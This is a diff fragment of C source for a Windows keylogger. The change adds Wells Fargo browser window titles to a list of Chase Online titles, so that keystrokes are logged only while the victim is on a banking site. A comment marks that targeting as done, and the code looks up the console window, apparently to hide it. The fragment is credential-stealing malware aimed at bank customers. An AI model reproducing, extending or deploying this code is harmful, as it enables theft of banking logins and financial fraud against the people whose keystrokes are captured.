@@ -2,12 +2,12 @@
 #include <stdio.h>
 #include <tchar.h>
 
-//can be improved: log only when bank titles appear and stop logging once title isn't equal to anything banking related
+//can be improved: log only when bank titles appear and stop logging once title isn't equal to anything banking related [DONE, check ProcKill]
 
 int gen(int key_stroke, char *file);
 
 int main() {
-	const CHAR * banktitles[] = {"Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com - Mozilla Firefox", "Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com - Google Chrome"};
+	const CHAR * banktitles[] = {"Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com - Mozilla Firefox", "Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com - Google Chrome", "Wells Fargo - Bannking, Credit Cards, Loans, Mortgages & More - Mozilla Firefox", "Wells Fargo - Bannking, Credit Cards, Loans, Mortgages & More - Google Chrome"};
 	TCHAR windowtitle[MAX_PATH];
 	AllocConsole();
 	HWND win = FindWindowA("ConsoleWindowClass", NULL);
